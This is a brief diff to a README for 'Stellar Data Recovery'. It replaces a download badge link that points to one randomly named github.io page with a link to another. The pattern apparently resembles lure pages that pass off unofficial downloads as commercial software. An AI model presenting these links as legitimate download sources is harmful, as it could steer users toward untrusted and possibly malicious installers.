@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://cdn.comparitech.com/wp-content/uploads/2017/12/Stellar-Data-Recovery-Logo-new.jpg)
 
-[![GET Stellar Data Recovery](https://img.shields.io/badge/GET%20%E2%80%94%20Stellar%20Data%20Recovery-0078D6?style=for-the-badge&logoColor=white)](https://chaseburkeyfvs.github.io/.github/stellar-data-recovery)
+[![GET Stellar Data Recovery](https://img.shields.io/badge/GET%20%E2%80%94%20Stellar%20Data%20Recovery-0078D6?style=for-the-badge&logoColor=white)](https://dimitrihowellywss.github.io/.github/stellar-data-recovery)
 
 ---
 
